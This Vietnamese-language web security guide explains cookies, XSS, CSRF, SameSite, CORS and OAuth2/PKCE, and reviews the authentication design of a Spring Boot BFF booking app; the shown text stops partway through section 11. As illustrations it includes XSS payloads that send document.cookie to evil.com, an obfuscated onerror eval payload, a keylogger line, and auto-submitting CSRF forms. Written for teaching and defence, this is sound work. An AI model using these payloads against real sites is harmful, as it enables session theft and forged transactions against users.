# CSRF, XSS, Cookie & Authentication Security
## Lý thuyết nền tảng, Phân tích kiến trúc BookingSalon & Hướng dẫn Production

> **Liên quan đến**: `BookingSalon_Production_Review.md` — Mục C4 (Critical: CSRF disabled toàn bộ)  
> **Áp dụng cho**: Spring Boot 3.5.3 + BFF Pattern + Keycloak 26 + React 19  
> **Mục tiêu**: Hiểu sâu bảo mật web từ gốc rễ đến chuẩn production

---

## MỤC LỤC

1. [Cookie — Nền tảng của mọi thứ](#1-cookie--nền-tảng-của-mọi-thứ)
2. [XSS — Cross-Site Scripting](#2-xss--cross-site-scripting)
3. [CSRF — Cross-Site Request Forgery](#3-csrf--cross-site-request-forgery)
4. [SameSite Cookie — Vũ khí chống CSRF hiện đại](#4-samesite-cookie--vũ-khí-chống-csrf-hiện-đại)
5. [CORS — Cross-Origin Resource Sharing](#5-cors--cross-origin-resource-sharing)
6. [Authentication Patterns — Các mô hình xác thực](#6-authentication-patterns--các-mô-hình-xác-thực)
7. [BFF Pattern — Backend For Frontend](#7-bff-pattern--backend-for-frontend)
8. [OAuth2 + PKCE + OIDC](#8-oauth2--pkce--oidc)
9. [Phân tích kiến trúc Authentication trong BookingSalon](#9-phân-tích-kiến-trúc-authentication-trong-bookingsalon)
10. [Tại sao CSRF bị disable và có an toàn không?](#10-tại-sao-csrf-bị-disable-và-có-an-toàn-không)
11. [Điểm mạnh và điểm yếu của kiến trúc hiện tại](#11-điểm-mạnh-và-điểm-yếu-của-kiến-trúc-hiện-tại)
12. [Đề xuất cải tiến chuẩn Production](#12-đề-xuất-cải-tiến-chuẩn-production)
13. [Checklist Security Production](#13-checklist-security-production)

---

## 1. Cookie — Nền tảng của mọi thứ

### 1.1 Cookie là gì?

Cookie là một **cơ chế lưu trữ nhỏ trên trình duyệt**, được server gửi xuống qua HTTP header `Set-Cookie`, và trình duyệt tự động gửi lại trong mọi request tiếp theo đến cùng domain đó.

```
Lần đầu login:
  Client ──[POST /login]──────────────────────────────► Server
  Server ◄──[200 OK]───────────────────────────────────  Server
          Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax

Các request sau:
  Client ──[GET /api/profile]──────────────────────────► Server
          Cookie: JSESSIONID=abc123         ← Tự động gửi!
  Server nhận cookie → tra cứu session → biết người dùng là ai
```

### 1.2 Các thuộc tính Cookie quan trọng

#### `HttpOnly`

```
Set-Cookie: JSESSIONID=abc123; HttpOnly
```

- **Tác dụng**: Cookie **không thể truy cập qua JavaScript** (`document.cookie`)
- **Bảo vệ chống**: XSS — dù attacker inject script, script đó cũng không đọc được cookie
- **Trade-off**: Frontend không thể đọc cookie này, mọi việc phải qua server

```javascript
// Nếu KHÔNG có HttpOnly → XSS có thể đánh cắp:
document.cookie  // → "JSESSIONID=abc123; username=bach"

// Nếu CÓ HttpOnly → JavaScript không thể thấy:
document.cookie  // → "" (cookie HttpOnly bị ẩn hoàn toàn)
```

#### `Secure`

```
Set-Cookie: JSESSIONID=abc123; Secure
```

- **Tác dụng**: Cookie **chỉ được gửi qua HTTPS**, không bao giờ gửi qua HTTP plain text
- **Bảo vệ chống**: Man-in-the-Middle attack — nếu dùng HTTP (không mã hóa), kẻ nghe lén mạng không thể bắt được cookie
- **Lưu ý**: Trong development (localhost), `Secure=false` là chấp nhận được vì localhost không cần HTTPS

#### `SameSite` (phân tích chi tiết ở mục 4)

```
Set-Cookie: JSESSIONID=abc123; SameSite=Strict | Lax | None
```

- **Tác dụng**: Kiểm soát khi nào browser gửi cookie trong cross-site request
- **Bảo vệ chống**: CSRF

#### `Path` và `Domain`

```
Set-Cookie: token=xyz; Path=/api; Domain=.bachbarber.vn
```

- `Path=/api` → cookie chỉ gửi khi request đến `/api/*`
- `Domain=.bachbarber.vn` → cookie gửi cho cả subdomain (`admin.bachbarber.vn`)

#### `Max-Age` và `Expires`

```
Set-Cookie: session=abc; Max-Age=2592000   # 30 ngày (giây)
Set-Cookie: session=abc; Expires=Thu, 08 Oct 2026 00:00:00 GMT
```

- Không có `Max-Age`/`Expires` → **Session cookie** (xóa khi đóng browser)
- Có `Max-Age` → **Persistent cookie** (tồn tại đến khi hết hạn)

### 1.3 Cookie Storage vs Other Storage

| Đặc điểm | Cookie | localStorage | sessionStorage | Memory (JS var) |
|---------|--------|--------------|----------------|-----------------|
| **Gửi tự động** | ✅ Có | ❌ Không | ❌ Không | ❌ Không |
| **HttpOnly** | ✅ Có thể | ❌ Không | ❌ Không | ❌ Không |
| **Thời gian sống** | Có thể cấu hình | Vĩnh viễn | Đến khi tab đóng | Đến khi page reload |
| **Dung lượng** | ~4KB | ~5MB | ~5MB | Không giới hạn |
| **XSS resistance** | Cao (HttpOnly) | Không | Không | Thấp nhất |
| **CSRF risk** | Có (nếu không có SameSite) | Không | Không | Không |
| **Cross-tab** | ✅ Có | ✅ Có | ❌ Không | ❌ Không |
| **Phù hợp cho** | Session ID, auth token | User preferences | Temp state (PKCE verifier) | Runtime state |

---

## 2. XSS — Cross-Site Scripting

### 2.1 Định nghĩa

XSS xảy ra khi **attacker inject JavaScript độc hại vào trang web**, và trình duyệt của nạn nhân thực thi code đó với toàn quyền của trang web đó.

```
Normal:
  Server trả về HTML → Browser render → User thấy trang web

XSS:
  Attacker submit input có chứa <script>...</script>
  Server lưu vào DB và trả về HTML mà không sanitize
  Browser render → Thực thi script của attacker
  Script chạy với quyền của domain đó (đọc cookie, gọi API, redirect...)
```

### 2.2 Các loại XSS

#### Reflected XSS (Non-persistent)

```
Victim nhận link: https://site.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

Server render:
<h1>Kết quả cho: <script>fetch('https://evil.com?c='+document.cookie)</script></h1>

Browser thực thi → gửi cookie đến evil.com
```

#### Stored XSS (Persistent) — Nguy hiểm nhất

```
1. Attacker đăng review với nội dung:
   "Sản phẩm tuyệt vời! <img src=x onerror=eval(atob('ZmV0Y2goJ...'))/>"

2. Server lưu vào DB mà không sanitize

3. Mọi user xem trang review → browser thực thi script
   → Đánh cắp session của tất cả nạn nhân

4. Trong context admin: attacker có thể chiếm tài khoản admin
```

#### DOM-based XSS

```javascript
// Frontend code viết không an toàn:
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Xin chào ${name}!`; // ← NGUY HIỂM

// URL: ?name=<img src=x onerror=alert(1)>
// innerHTML render HTML → thực thi onerror handler
```

### 2.3 Hậu quả của XSS

```
1. Session Hijacking:
   document.cookie  → lấy JSESSIONID (nếu không HttpOnly)
   Dùng JSESSIONID giả mạo request như nạn nhân

2. Credential Theft:
   Tạo fake login form overlay → user nhập password → gửi về evil.com

3. Keylogging:
   document.addEventListener('keypress', e => sendToEvil(e.key))

4. Cryptomining / Drive-by attacks:
   Chạy code mining tiền ảo dùng CPU của nạn nhân

5. CSRF attack bypass:
   Nếu site có CSRF token nhưng bị XSS → script đọc CSRF token từ DOM
   → Bỏ qua cả CSRF protection
```

### 2.4 Chống XSS

```
1. Output Encoding — Escape mọi user input trước khi render:
   < → &lt;    > → &gt;    " → &quot;    ' → &#x27;    & → &amp;

2. Framework bảo vệ tự động:
   React: {variable} → tự động escape (không render HTML tags)
   KHÔNG dùng dangerouslySetInnerHTML nếu không cần

3. Content Security Policy (CSP) Header:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz'
   → Browser từ chối thực thi script không có nonce đúng

4. HttpOnly Cookie:
   Dù XSS thành công, script không đọc được cookie → không hijack session

5. Input Validation / Sanitization:
   Dùng thư viện như DOMPurify để sanitize HTML input khi cần render rich text
```

---

## 3. CSRF — Cross-Site Request Forgery

### 3.1 Định nghĩa và cơ chế tấn công

CSRF (Cross-Site Request Forgery) hay còn gọi là "Sea-Surf", "Session Riding" là kiểu tấn công trong đó **attacker lừa browser của nạn nhân gửi request đến site nạn nhân đang đăng nhập**, mà không cần biết cookie hay session của nạn nhân.

**Điều kiện để CSRF xảy ra:**
1. Nạn nhân **đang đăng nhập** vào target site (có session cookie hợp lệ)
2. Target site **xác thực bằng cookie** (không phải JWT trong header)
3. Target site **không kiểm tra nguồn gốc** của request

### 3.2 Ví dụ tấn công CSRF chi tiết

```
Kịch bản: BookingSalon dùng session cookie, không có CSRF protection

Bước 1: User đăng nhập BookingSalon
  Browser lưu: Cookie: JSESSIONID=abc123

Bước 2: User vô tình truy cập evil-hacker.com trong cùng browser session

Bước 3: evil-hacker.com có HTML:
  <html>
    <body onload="document.forms[0].submit()">
      <form action="https://bachbarber.vn/api/orders" method="POST">
        <input name="productId" value="999">
        <input name="quantity" value="100">
        <input name="address" value="123 Evil Street">
      </form>
    </body>
  </html>

Bước 4: Browser tự động submit form
  POST https://bachbarber.vn/api/orders
  Cookie: JSESSIONID=abc123   ← Browser TỰ ĐỘNG gửi kèm!

Bước 5: Server nhận request
  → Thấy cookie hợp lệ → Xác nhận là User đang đăng nhập
  → Tạo đơn hàng 100 sản phẩm gửi về địa chỉ Evil Street
  → User bị mất tiền, không hề hay biết!
```

### 3.3 Tại sao CSRF nguy hiểm?

```
Attacker KHÔNG cần biết:
  ✗ Cookie/token của nạn nhân (không cần đọc)
  ✗ Password của nạn nhân
  ✗ Session ID

Attacker CHỈ cần:
  ✓ Lừa nạn nhân vào trang của attacker (hoặc comment XSS trên site khác)
  ✓ Biết URL endpoint của target site
  ✓ Nạn nhân đang đang nhập (có session cookie)

Browser TỰ ĐỘNG làm hộ attacker:
  → Gửi cookie kèm theo mọi cross-origin request (trước khi có SameSite)
```

### 3.4 Phương thức tấn công CSRF

#### Image tag GET request

```html
<!-- Kẻ tấn công nhúng vào comment section hoặc email -->
<img src="https://bank.vn/transfer?to=attacker&amount=999999" width="0" height="0">
<!-- Browser tải "ảnh" → thực thi GET request → chuyển tiền -->
```

#### Auto-submit form POST request

```html
<form action="https://target.com/api/change-email" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>
```

#### JSON POST với fetch (chỉ hoạt động khi CORS sai cấu hình)

```javascript
// Từ evil.com
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',   // Gửi cookie
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ amount: 999999, to: 'attacker' })
});
// Thường bị CORS chặn nếu server cấu hình đúng
```

### 3.5 Cách phòng chống CSRF truyền thống — Synchronizer Token Pattern

```
Bước 1: User request trang có form
  Server tạo CSRF token ngẫu nhiên, lưu vào session
  Nhúng vào HTML form:
    <form>
      <input type="hidden" name="_csrf" value="xyz789-random-token">
      ...
    </form>

Bước 2: User submit form
  POST /api/orders
  Body: productId=1&quantity=2&_csrf=xyz789-random-token
  Cookie: JSESSIONID=abc123

Bước 3: Server verify
  → Lấy token từ session: "xyz789-random-token"
  → So sánh với token trong request body/header
  → Khớp → Cho phép
  → Không khớp → Từ chối 403 Forbidden

Attacker không thể tấn công vì:
  → Attacker ở evil.com không thể đọc HTML của target.com (Same-Origin Policy)
  → Nên không biết được CSRF token trong form
  → POST của attacker thiếu token → bị từ chối
```

---

## 4. SameSite Cookie — Vũ khí chống CSRF hiện đại

### 4.1 SameSite là gì?

`SameSite` là thuộc tính cookie kiểm soát **khi nào browser được phép gửi cookie kèm theo cross-site request**. Đây là giải pháp chống CSRF ở tầng trình duyệt, không cần thêm logic server.

### 4.2 Phân biệt "Same-Site" và "Same-Origin"

```
Origin = Protocol + Domain + Port
  https://bachbarber.vn:443        ← Một origin
  http://bachbarber.vn:80         ← Origin KHÁC (protocol khác)
  https://api.bachbarber.vn:443   ← Origin KHÁC (subdomain khác)

Site = eTLD+1 (effective Top-Level Domain + 1)
  bachbarber.vn                   ← Một site
  api.bachbarber.vn               ← CÙNG site (same site)
  app.bachbarber.vn               ← CÙNG site (same site)
  evil.com                        ← Khác site (cross-site)
```

### 4.3 Giá trị SameSite

#### `SameSite=Strict`

```
Cookie chỉ gửi khi:
  ✅ Request xuất phát từ CÙNG SITE với cookie domain

Cookie KHÔNG gửi khi:
  ❌ User click link từ email dẫn đến site
  ❌ User click link từ Google dẫn đến site
  ❌ User bookmark → navigate đến site (nếu lần trước từ cross-site)
  ❌ Mọi cross-site navigation

Ưu điểm: Bảo vệ CSRF tốt nhất
Nhược điểm: UX kém - user từ email sẽ bị logout
```

#### `SameSite=Lax` (Default của browser hiện đại)

```
Cookie GỬI khi:
  ✅ Same-site request (mọi loại)
  ✅ Cross-site TOP-LEVEL NAVIGATION với method SAFE (GET, HEAD, OPTIONS)
     Ví dụ: User click link → navigate đến site (GET)

Cookie KHÔNG gửi khi:
  ❌ Cross-site POST, PUT, DELETE, PATCH
  ❌ Cross-site iframe loads
  ❌ Cross-site image/script/fetch (ngầm, không phải navigation)

Ưu điểm: Cân bằng tốt giữa bảo mật và UX
Nhược điểm: Vẫn có thể bị CSRF qua GET request nếu GET có side-effects
```

#### `SameSite=None; Secure`

```
Cookie gửi trong MỌI cross-site request
Phải đi kèm Secure=true (HTTPS)

Dùng cho:
  - Third-party cookies (analytics, ads)
  - Embedded widgets (payment iframe từ domain khác)
  - Cross-site API calls (BFF từ frontend domain khác hoàn toàn)
```

### 4.4 Bảng quyết định SameSite

| Request Type | Strict | Lax | None |
|-------------|--------|-----|------|
| Same-site link click | ✅ | ✅ | ✅ |
| Same-site form POST | ✅ | ✅ | ✅ |
| Cross-site link click (GET) | ❌ | ✅ | ✅ |
| Cross-site form POST | ❌ | ❌ | ✅ |
| Cross-site fetch/XHR | ❌ | ❌ | ✅ |
| Cross-site iframe | ❌ | ❌ | ✅ |

---

## 5. CORS — Cross-Origin Resource Sharing

### 5.1 Same-Origin Policy (SOP) — Quy tắc gốc

Mặc định, **JavaScript chỉ có thể đọc response từ cùng origin** với trang web đang chạy. Đây là cơ chế bảo mật cốt lõi của trình duyệt:

```
Frontend trên https://bachbarber.vn muốn gọi:
  https://bachbarber.vn/api/users   ✅ SAME ORIGIN → OK
  https://api.bachbarber.vn/users   ❌ CROSS ORIGIN → Bị chặn
  http://localhost:8080/api/users   ❌ CROSS ORIGIN → Bị chặn

LƯU Ý QUAN TRỌNG:
  Browser VẪN GỬI request đến cross-origin server
  Server VẪN NHẬN và XỬ LÝ request
  Browser chỉ KHÔNG CHO JavaScript đọc response
  (CORS không bảo vệ server, chỉ bảo vệ browser!)
```

### 5.2 CORS Preflight

```
Frontend gọi cross-origin với method POST hoặc có custom header:
  Browser trước tiên gửi: OPTIONS /api/orders
  Request headers:
    Origin: http://localhost:5173
    Access-Control-Request-Method: POST
    Access-Control-Request-Headers: Content-Type

Server trả lời:
  Access-Control-Allow-Origin: http://localhost:5173
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Allow-Credentials: true
  Access-Control-Max-Age: 3600

Nếu server cho phép → Browser gửi request thật
Nếu server từ chối (không có headers trên) → Browser block, JS lỗi "CORS error"
```

### 5.3 CORS và Cookie — `credentials: include`

```javascript
// Khi cần gửi cookie kèm cross-origin request:
fetch('http://localhost:8080/api/profile', {
  credentials: 'include'  // ← Báo browser gửi cookie kèm theo
});
```

```java
// Server phải cấu hình:
configuration.setAllowCredentials(true);          // ← Cho phép credentials
configuration.setAllowedOrigins(List.of(
    "http://localhost:5173"                        // ← KHÔNG được dùng "*" khi credentials=true
));
```

---

## 6. Authentication Patterns — Các mô hình xác thực

### 6.1 Pattern 1: Session-Based Authentication

```
Login:
  Client ──[POST /login, username+password]──► Server
  Server: Kiểm tra password, tạo Session, lưu vào SessionStore
  Server ──[200 OK, Set-Cookie: JSESSIONID=abc]─► Client

Mỗi request sau:
  Client ──[GET /api, Cookie: JSESSIONID=abc]──► Server
  Server: Tra cứu SessionStore, tìm Session "abc" → lấy userId
  Server ──[200 OK, data...]─────────────────── Client

Đặc điểm:
  ✅ Session có thể revoke ngay lập tức (invalidate session)
  ✅ Server kiểm soát hoàn toàn trạng thái
  ✅ Không lo token rotation phức tạp
  ❌ Cần SessionStore (memory, Redis, DB) → stateful
  ❌ Khó scale horizontal (cần sticky session hoặc shared store)
  ❌ CSRF risk cao khi dùng với form-based HTML
```

### 6.2 Pattern 2: Token-Based Authentication (JWT Stateless)

```
Login:
  Client ──[POST /login]──────────────────────► Server
  Server ──[200 OK, {"access_token": "eyJ..."}]► Client
  Client lưu token vào localStorage/memory

Mỗi request sau:
  Client ──[GET /api, Authorization: Bearer eyJ...]► Server
  Server: Verify JWT signature → lấy claims → biết userId
  Server không cần tra cứu gì thêm (stateless)

Đặc điểm:
  ✅ Hoàn toàn stateless → dễ scale
  ✅ Không cần SessionStore
  ✅ Không có CSRF risk (token trong header, không phải cookie)
  ❌ Không thể revoke trước khi hết hạn (phải dùng blacklist)
  ❌ Token trong localStorage → XSS có thể đánh cắp
  ❌ Token lớn, gửi theo mọi request
```

### 6.3 Pattern 3: BFF (Backend For Frontend) — Kết hợp tốt nhất

```
Login:
  Client ──[POST /api/auth/login]─────────────► BFF (Spring Boot)
  BFF: Đăng nhập với Keycloak, nhận JWT (access + refresh)
  BFF: Lưu JWT vào server-side HttpSession (KHÔNG gửi về client)
  BFF ──[200 OK, Set-Cookie: JSESSIONID=abc; HttpOnly]► Client

Mỗi request sau:
  Client ──[GET /api/profile, Cookie: JSESSIONID=abc]► BFF
  BFF: Lấy JWT từ session "abc"
  BFF: Gọi backend resource với JWT
  BFF ──[200 OK, profile data]────────────────────── Client

Đặc điểm:
  ✅ Token không bao giờ ra client → XSS không thể đánh cắp
  ✅ HttpOnly cookie → XSS không đọc được session ID
  ✅ Server kiểm soát revocation
  ✅ Client code đơn giản (không cần handle token rotation)
  ❌ Cần quản lý HttpSession (stateful)
  ❌ CSRF risk (dùng cookie) → phải có CSRF protection
  ❌ Thêm một layer phức tạp
```

---

## 7. BFF Pattern — Backend For Frontend

### 7.1 Tổng quan kiến trúc BFF

```
┌──────────────────────────────────────────────────────────────┐
│                        BROWSER                                │
│  React App  ◄──────────────────────────────────────────────  │
│  (Không có token)                                            │
└─────────────────────┬────────────────────────────────────────┘
                      │ Cookie: JSESSIONID=abc (HttpOnly)
                      ▼
┌──────────────────────────────────────────────────────────────┐
│                    BFF (Spring Boot)                          │
│  ┌─────────────────────────────────────────────────────┐     │
│  │  HttpSession Store                                   │     │
│  │  session_id: "abc"                                   │     │
│  │    BFF_ACCESS_TOKEN: "eyJhbGciOiJSUzI1N..."         │     │
│  │    BFF_REFRESH_TOKEN: "eyJhbGciOiJIUzI1N..."        │     │
│  │    BFF_EXPIRES_AT: 2026-10-08T16:05:00Z             │     │
│  │    BFF_KEYCLOAK_ID: "uuid-của-user"                 │     │
│  └─────────────────────────────────────────────────────┘     │
└─────────────────────┬────────────────────────────────────────┘
                      │ Authorization: Bearer eyJhbGci...
                      ▼
┌──────────────────────────────────────────────────────────────┐
│                    Keycloak (IAM)                             │
│  Xác thực JWT, quản lý user, roles, SSO                     │
└──────────────────────────────────────────────────────────────┘
```

### 7.2 Tại sao BFF cần đặc biệt chú ý CSRF?

BFF dùng **cookie để xác định danh tính** → Đây chính xác là điều kiện để CSRF tấn công:

```
User đang đăng nhập BookingSalon (có JSESSIONID trong browser)
User click link → vào evil.com

evil.com có form:
  <form action="http://bachbarber.vn/api/orders" method="POST">
    <input name="items" value="[{productId:1, qty:100}]">
  </form>

Browser gửi request:
  POST http://bachbarber.vn/api/orders
  Cookie: JSESSIONID=abc123   ← Tự động theo!
  Body: items=[{productId:1, qty:100}]

BFF nhận → tra session → thấy user đang đăng nhập → xử lý đơn hàng
→ User bị tấn công CSRF!
```

---

## 8. OAuth2 + PKCE + OIDC

### 8.1 OAuth2 Authorization Code Flow + PKCE

PKCE (Proof Key for Code Exchange) là mở rộng của Authorization Code Flow, thiết kế cho **public clients** (browser app, mobile app) không thể giữ bí mật `client_secret`.

```
Bước 1: Frontend tạo PKCE parameters
  code_verifier = random 43-128 chars (stored in sessionStorage)
  code_challenge = BASE64URL(SHA256(code_verifier))
  state = random string (chống CSRF trong OAuth flow)

Bước 2: Redirect đến Keycloak
  GET /realms/booking-salon-realm/protocol/openid-connect/auth
    ?client_id=booking-salon-client
    &redirect_uri=http://localhost:5173/oauth2/callback
    &response_type=code
    &scope=openid profile email
    &code_challenge=abc123...
    &code_challenge_method=S256
    &state=xyz789...

Bước 3: User đăng nhập tại Keycloak

Bước 4: Keycloak redirect về frontend
  http://localhost:5173/oauth2/callback
    ?code=AUTH_CODE_abc
    &state=xyz789...   ← Frontend verify state

Bước 5: Frontend gửi code về BFF
  POST /api/auth/oauth2/callback
  Body: { code: "AUTH_CODE_abc", codeVerifier: "original_verifier", redirectUri: "..." }

Bước 6: BFF exchange code với Keycloak (server-to-server)
  POST /token
    grant_type=authorization_code
    code=AUTH_CODE_abc
    code_verifier=original_verifier   ← Keycloak verify: SHA256(verifier) == challenge
    client_id=booking-salon-client
    redirect_uri=...

Bước 7: Keycloak trả về tokens, BFF lưu vào session
  → Frontend chỉ nhận JSESSIONID cookie (không bao giờ thấy access_token)
```

### 8.2 Tại sao PKCE an toàn hơn?

```
Nếu không có PKCE và auth code bị chặn giữa đường:
  Attacker có code → Exchange lấy token → Chiếm tài khoản

Với PKCE:
  code_verifier chỉ có frontend biết (trong sessionStorage)
  code_challenge là hash của verifier (không thể reverse engineer)
  Keycloak verify: SHA256(submitted_verifier) phải == stored_challenge
  Attacker có code nhưng không có verifier → không exchange được token
```

---

## 9. Phân tích kiến trúc Authentication trong BookingSalon

### 9.1 Luồng đăng nhập Direct (Username/Password)

```
Frontend (React)              BFF (Spring Boot)         Keycloak

  1. User nhập username/password
     loginDirect("bach", "pass123")
     
  2. POST /api/auth/login          ──────────────────►
     Body: {username, password}    
     credentials: "include"

                                   3. AuthService.login()
                                      → Gọi Keycloak token endpoint
                                      POST /realms/.../token
                                      grant_type=password
                                      username=bach, password=pass123
                                                              ──────►
                                                      4. Keycloak xác thực
                                                         Trả về access_token,
                                                         refresh_token
                                                              ◄──────
                                   5. BffSessionService.saveSessionTokens()
                                      HttpSession["BFF_ACCESS_TOKEN"] = eyJ...
                                      HttpSession["BFF_REFRESH_TOKEN"] = eyJ...
                                      HttpSession["BFF_EXPIRES_AT"] = 2026-...
                                      Set-Cookie: JSESSIONID=abc; HttpOnly; Lax
                                      
  6. Response: {user: {...}}      ◄─────────────────────
     (KHÔNG CÓ access_token!)
     
  7. setUserInfo(data.user)
     saveProfile(data.user) → localStorage["bs_user_profile"]
     (Chỉ lưu thông tin user, không phải token)
```

### 9.2 Luồng đăng nhập PKCE (Google SSO)

```
Frontend                    BFF                  Keycloak

  1. loginWithGoogle()
     → generateCodeVerifier()
     → generateCodeChallenge()
     → Lưu verifier vào sessionStorage
     → Redirect đến Keycloak

                                                  2. Keycloak login page
                                                     User chọn Google
                                                     Google auth
                                                     Keycloak tạo auth code

  3. Redirect về /oauth2/callback
     ?code=AUTH_CODE&state=xyz

  4. handleOAuth2Callback()
     POST /api/auth/oauth2/callback ──────────►
     {code, codeVerifier, redirectUri}

                             5. authService.handleOAuth2Callback()
                                → Exchange code+verifier với Keycloak
                                                  ──────────────────►
                                                  6. Verify PKCE
                                                     Trả về tokens
                                                  ◄──────────────────
                             7. Lưu vào HttpSession
                                Set-Cookie: JSESSIONID=def; HttpOnly; Lax

  8. {user: {...}}          ◄──────────────────
     saveProfile(user)
```

### 9.3 Luồng gọi API sau khi đăng nhập

```
Frontend (React)           BFF (Spring Boot)         Resource/Service

  1. fetch("/api/bookings", {
       credentials: "include"
     })
     Cookie: JSESSIONID=abc (tự động)

                            2. SecurityConfig: bearerTokenResolver
                               request.getSession(false) → session "abc"
                               session.getAttribute("BFF_ACCESS_TOKEN") → "eyJ..."
                               Instant.now() < BFF_EXPIRES_AT - 30s ?
                               → Còn hạn: Dùng token
                               → Hết hạn: refreshSessionTokens() tự động
                               
                            3. oauth2ResourceServer validates JWT
                               JwtAuthenticationConverter → roles từ Keycloak
                               
                            4. BookingService.getBookings(userId)
                            
  5. Response data          ◄───────────────────────────
```

### 9.4 Luồng Auto-Refresh Token (Transparent)

```
Mọi 4 phút (interval trong authProvider.jsx):
  checkCurrentSession() → GET /api/auth/me → credentials: "include"
  
BFF nhận request:
  bearerTokenResolver() gọi resolveValidAccessToken()
  → Kiểm tra BFF_EXPIRES_AT
  → Nếu còn < 30 giây → refreshSessionTokens()
     Gọi Keycloak: grant_type=refresh_token
     Cập nhật session: BFF_ACCESS_TOKEN = new_token
     (transparent với frontend!)
```

### 9.5 Cấu hình Cookie hiện tại

Từ `BffSessionService.java` dòng 98-104:

```java
ResponseCookie sessionCookie = ResponseCookie.from("JSESSIONID", session.getId())
    .httpOnly(true)   ✅ Tốt: XSS không đọc được
    .secure(false)    ⚠️  Xấu: Nên true trong production (cần HTTPS)
    .path("/")        ✅ OK
    .maxAge(30L * 24 * 3600)  ⚠️  30 ngày: Quá dài, rủi ro session fixation
    .sameSite("Lax")  ✅ Tốt hơn None, nhưng Strict an toàn hơn
    .build();
```

---

## 10. Tại sao CSRF bị disable và có an toàn không?

### 10.1 Code hiện tại

```java
// SecurityConfig.java dòng 40
http
    .csrf(csrf -> csrf.disable())  // ← CSRF tắt hoàn toàn
```

### 10.2 Lý do tắt CSRF (Lập luận của developer)

**Lý do 1: Dùng JWT Bearer Token**

Phần lớn ứng dụng hiện đại tắt CSRF vì họ xác thực bằng `Authorization: Bearer <token>` trong header. Kẻ tấn công từ evil.com không thể tự thêm header tùy ý vào cross-site request của browser (CORS policy).

**Lý do 2: SameSite=Lax Cookie**

CSRF tấn công POST bị chặn bởi `SameSite=Lax`:
```
evil.com submit form POST → bachbarber.vn/api/orders
Browser có SameSite=Lax → KHÔNG gửi cookie cho cross-site POST
→ Server không nhận được session → Unauthorized → CSRF thất bại
```

### 10.3 Phân tích: Có thực sự an toàn không?

**TRƯỜNG HỢP AN TOÀN (Phần lớn API):**

```
REST API nhận JSON, xác thực qua cookie BFF:

evil.com → fetch('https://bachbarber.vn/api/orders', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({...})
})

Lý do AN TOÀN:
  1. CORS: bachbarber.vn không cho phép origin evil.com với credentials
     → Browser block ngay từ đầu (SOP/CORS)
     
  2. SameSite=Lax: Cross-site POST không gửi cookie
     → Server thấy request nhưng không có session
     → 401 Unauthorized
     
  3. JSON Content-Type cần preflight OPTIONS:
     → Browser gửi OPTIONS trước
     → Server từ chối origin evil.com
     → Không gửi request thật
```

**TRƯỜNG HỢP VẪN CÓ RỦI RO:**

```
Rủi ro 1: SameSite=Lax không bảo vệ GET request có side-effects
  evil.com: <img src="https://bachbarber.vn/api/payment/confirm?orderId=123">
  SameSite=Lax CHO PHÉP gửi cookie cho GET cross-site navigation
  Nếu endpoint GET có side effect → CSRF vẫn xảy ra
  
  Kiểm tra code: Các API hiện tại có GET endpoint nào có side effect không?
  → /api/payments/confirm?... → Cần kiểm tra
  → Nên dùng POST cho mọi action có side effect

Rủi ro 2: Browser cũ không hỗ trợ SameSite
  IE11, một số mobile browser cũ → bỏ qua SameSite
  → Fallback về CSRF vulnerability cũ
  
Rủi ro 3: Kết hợp với XSS
  Nếu site bị XSS → script chạy TRONG site → Same-origin → Cookie được gửi
  XSS bypass cả SameSite protection
  
Rủi ro 4: Session Fixation (liên quan)
  Kẻ tấn công thiết lập session ID cho nạn nhân trước khi login
  Nạn nhân login với session ID attacker biết
  Hiện tại: sessionFixation().none() → KHÔNG có protection!
```

### 10.4 Kết luận về tắt CSRF

```
Câu trả lời: Tắt CSRF trong kiến trúc BFF + SameSite=Lax là
CÓ THỂ CHẤP NHẬN nhưng KHÔNG PHẢI BEST PRACTICE.

Lý do có thể chấp nhận:
  ✅ CORS được cấu hình đúng (whitelist origin)
  ✅ SameSite=Lax chặn phần lớn CSRF attack
  ✅ Không dùng Bearer token trong localStorage (tránh XSS token theft)
  ✅ JSON API (không phải form-based HTML) giảm attack surface

Lý do KHÔNG phải best practice:
  ❌ Defense in depth: Nên có nhiều lớp bảo vệ
  ❌ SameSite=Lax không bảo vệ GET có side-effects
  ❌ Browser cũ fallback
  ❌ sessionFixation().none() là cấu hình nguy hiểm
  ❌ Trong production: Nên bật CSRF với Double Submit Cookie pattern
```

---

## 11. Điểm mạnh và điểm yếu của kiến trúc hiện tại

### 11.1 Điểm mạnh (Đã làm đúng)

**✅ BFF Pattern — Tokens không bao giờ ra browser**

```java
// BffSessionService.java: Token lưu server-side, không gửi về client
session.setAttribute(SESSION_ACCESS_TOKEN, accessToken);
// Response về client: chỉ có user info, không có token
return ResponseEntity.ok(sanitize(authResponse)); // sanitize() xóa token
```

Đây là **điểm mạnh nhất** của kiến trúc. Dù site bị XSS, script không thể lấy được JWT access token vì nó chưa bao giờ rời khỏi server.

**✅ HttpOnly Cookie**

```java
.httpOnly(true)  // JavaScript không đọc được JSESSIONID
```

**✅ purgeBrowserTokens() khi logout**

```javascript
// authProvider.jsx
export const purgeBrowserTokens = () => {
  const keysToRemove = ["refresh_token", "access_token", "token", "jwt", "id_token"];
  keysToRemove.forEach(k => {
    localStorage.removeItem(k);
    sessionStorage.removeItem(k);
  });
};
```

Đảm bảo không còn token tồn đọng nếu có version cũ từng lưu token.

**✅ Token Auto-Refresh hoàn toàn server-side**

```java
// BffSessionService.resolveValidAccessToken() - Refresh ngầm khi cần
if (Instant.now().isBefore(expiresAt.minusSeconds(30))) {
    return accessToken;
}
// Hết hạn → refresh tự động với Keycloak, update session
```

Frontend không cần quan tâm đến token expiry - BFF xử lý hoàn toàn.

**✅ SameSite=Lax chặn phần lớn CSRF**

**✅ CORS whitelist đúng**

```java
configuration.setAllowedOrigins(origins); // Không dùng wildcard *
configuration.setAllowCredentials(true);   // Bắt buộc khi dùng cookie
```

